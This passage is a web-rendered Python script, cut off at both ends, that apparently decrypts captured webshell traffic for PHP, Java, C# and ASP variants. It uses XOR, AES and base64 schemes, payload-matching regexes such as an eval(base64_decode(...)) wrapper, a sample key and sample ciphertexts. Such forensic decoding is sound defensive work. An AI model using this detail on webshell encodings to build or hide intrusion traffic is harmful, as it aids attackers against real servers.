class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span class=\"line\">import gzip</span><br><span class=\"line\">import re</span><br><span class=\"line\">from urllib.parse import unquote</span><br><span class=\"line\">from Crypto.Cipher import AES</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def unpad(s):</span><br><span class=\"line\">    return s[:-ord(s[len(s) - 1:])]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def XOR(D, K):</span><br><span class=\"line\">    result = []</span><br><span class=\"line\">    for i in range(len(D)):</span><br><span class=\"line\">        c = K[i + 1 &amp; 15]</span><br><span class=\"line\">        if not isinstance(D[i], int):</span><br><span class=\"line\">            d = ord(D[i])</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            d = D[i]</span><br><span class=\"line\">        result.append(d ^ ord(c))</span><br><span class=\"line\">    return b&#x27;&#x27;.join([i.to_bytes(1, byteorder=&#x27;big&#x27;) for i in result])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class PHP_XOR_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode().split(self.pass_ + &#x27;=&#x27;)[1]</span><br><span class=\"line\">        return XOR(base64.b64decode(unquote(payload)), self.key)</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload[16:-16]</span><br><span class=\"line\">        return gzip.decompress(XOR(base64.b64decode(payload.decode()), self.key))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class PHP_XOR_RAW:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        return XOR(payload, self.key)</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        return gzip.decompress(XOR(payload, self.key))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class PHP_EVAL_XOR_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        body = unquote(payload.decode())</span><br><span class=\"line\">        match = re.findall(r&quot;eval\\(base64_decode\\(strrev\\(urldecode\\(&#x27;(.*)&#x27;\\)&quot;, str(body))</span><br><span class=\"line\">        # encode_body = regexphp(,body)</span><br><span class=\"line\">        tmp = reversed(match[0])</span><br><span class=\"line\">        tmp_base64 = &#x27;&#x27;.join(tmp)</span><br><span class=\"line\">        return base64.b64decode(tmp_base64)</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload[16:-16]</span><br><span class=\"line\">        return gzip.decompress(XOR(base64.b64decode(payload.decode()), self.key))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class JAVA_AES_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode().split(self.pass_ + &#x27;=&#x27;)[1]</span><br><span class=\"line\">        encrypted_text = base64.b64decode(unquote(payload))</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            decrypted_text = gzip.decompress(decrypted_text)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            pass</span><br><span class=\"line\">        return decrypted_text</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode()</span><br><span class=\"line\">        payload = payload[16:-16]</span><br><span class=\"line\">        encrypted_text = base64.b64decode(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        return gzip.decompress(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class JAVA_AES_RAW:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        &quot;&quot;&quot;&quot;16进制字符串: d26414f92d691674f3dedb554e70202550ff681c03dcd3572f74df4c4c68d7078abb82808610aee869f51107d7d66f60&quot;&quot;&quot;</span><br><span class=\"line\">        encrypted_text = payload</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            decrypted_text = gzip.decompress(decrypted_text)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            pass</span><br><span class=\"line\">        return decrypted_text</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        encrypted_text = payload</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_ECB)</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        return gzip.decompress(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class CSHAP_AES_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode().split(self.pass_ + &#x27;=&#x27;)[1]</span><br><span class=\"line\">        encrypted_text = base64.b64decode(unquote(payload))</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            decrypted_text = gzip.decompress(decrypted_text)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            pass</span><br><span class=\"line\">        return decrypted_text</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode()</span><br><span class=\"line\">        payload = payload[16:-16]</span><br><span class=\"line\">        encrypted_text = base64.b64decode(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        return gzip.decompress(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class CSHAP_EVAL_AES_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        body = unquote(payload.decode())</span><br><span class=\"line\">        match = re.findall(r&quot;HttpUtility.UrlDecode\\(&#x27;(.*)&#x27;\\)\\)\\)&quot;, str(body))</span><br><span class=\"line\">        tmp = match[0]</span><br><span class=\"line\">        decrypted_text = base64.b64decode(tmp)</span><br><span class=\"line\"></span><br><span class=\"line\">        return decrypted_text</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode()</span><br><span class=\"line\">        payload = payload[16:-16]</span><br><span class=\"line\">        encrypted_text = base64.b64decode(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        return gzip.decompress(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class CSHAP_ASMX_AES_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        body = payload.decode()</span><br><span class=\"line\">        match = re.findall(r&quot;&lt;&#123;&#125;&gt;(.*?)&lt;/&#123;&#125;&gt;&quot;.format(self.pass_, self.pass_), str(body))</span><br><span class=\"line\"></span><br><span class=\"line\">        encrypted_text = base64.b64decode(unquote(match[0]))</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            decrypted_text = gzip.decompress(decrypted_text)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            pass</span><br><span class=\"line\">        return decrypted_text</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        body = payload.decode()</span><br><span class=\"line\">        match = re.findall(r&quot;&lt;&#123;&#125;Result&gt;(.*?)&lt;/&#123;&#125;Result&gt;&quot;.format(self.pass_, self.pass_), str(body))</span><br><span class=\"line\"></span><br><span class=\"line\">        payload = match[0][16:-16]</span><br><span class=\"line\">        encrypted_text = base64.b64decode(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        return gzip.decompress(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class CSHAP_AES_RAW:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        encrypted_text = payload</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            decrypted_text = gzip.decompress(decrypted_text)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            pass</span><br><span class=\"line\">        return decrypted_text</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        encrypted_text = payload</span><br><span class=\"line\"></span><br><span class=\"line\">        cipher = AES.new(key=self.key.encode(), mode=AES.MODE_CBC, iv=self.key.encode())</span><br><span class=\"line\">        decrypted_text = cipher.decrypt(encrypted_text)</span><br><span class=\"line\">        decrypted_text = unpad(decrypted_text)</span><br><span class=\"line\">        return gzip.decompress(decrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class ASP_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode().split(self.pass_ + &#x27;=&#x27;)[1]</span><br><span class=\"line\">        return base64.b64decode(unquote(payload))</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode()</span><br><span class=\"line\">        payload = payload[6:-6]</span><br><span class=\"line\">        return base64.b64decode((payload))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class ASP_EVAL_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        body = unquote(payload.decode())</span><br><span class=\"line\">        match = re.findall(r&#x27;bd\\(&quot;&quot;&quot;&quot;(.*?)&quot;&quot;&quot;&quot;\\)&#x27;, str(body))</span><br><span class=\"line\">        tmp = bytes(bytearray.fromhex(match[0]))</span><br><span class=\"line\">        return tmp</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload[6:-6]</span><br><span class=\"line\">        return base64.b64decode((payload))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class ASP_RAW:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        return payload</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        return payload</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class ASP_XOR_BASE64:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode().split(self.pass_ + &#x27;=&#x27;)[1]</span><br><span class=\"line\">        return XOR(base64.b64decode(unquote(payload)), self.key)</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        payload = payload.decode()</span><br><span class=\"line\">        payload = payload[6:-6]</span><br><span class=\"line\">        return XOR(base64.b64decode(payload), self.key)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class ASP_XOR_RAW:</span><br><span class=\"line\">    def __init__(self, pass_, key):</span><br><span class=\"line\">        self.pass_ = pass_</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_req_payload(self, payload):</span><br><span class=\"line\">        return XOR(payload, self.key)</span><br><span class=\"line\"></span><br><span class=\"line\">    def decrypt_res_payload(self, payload):</span><br><span class=\"line\">        return XOR(payload, self.key)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    decrypter = PHP_XOR_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(b&#x27;pass=DlMRWA1cL1gOVDc2MjRhRwZFEQ==&#x27;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(b&#x27;72a9c691ccdaab98fL1tMGI4YTljO/79NDQm7r9PZzBiOA==b4c4e1f6ddd2a488&#x27;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    # php_xor_raw_req = &#x27;0e5311580d5c2f580e54373632346147064511&#x27;</span><br><span class=\"line\">    # php_xor_raw_res = &#x27;7cbd6d3062386139633bfefd343426eebf4f67306238&#x27;</span><br><span class=\"line\">    # decrypter = PHP_XOR_RAW(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    # data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(php_xor_raw_req)))</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\">    # data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(php_xor_raw_res)))</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    # decrypter = PHP_EVAL_XOR_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    # data = 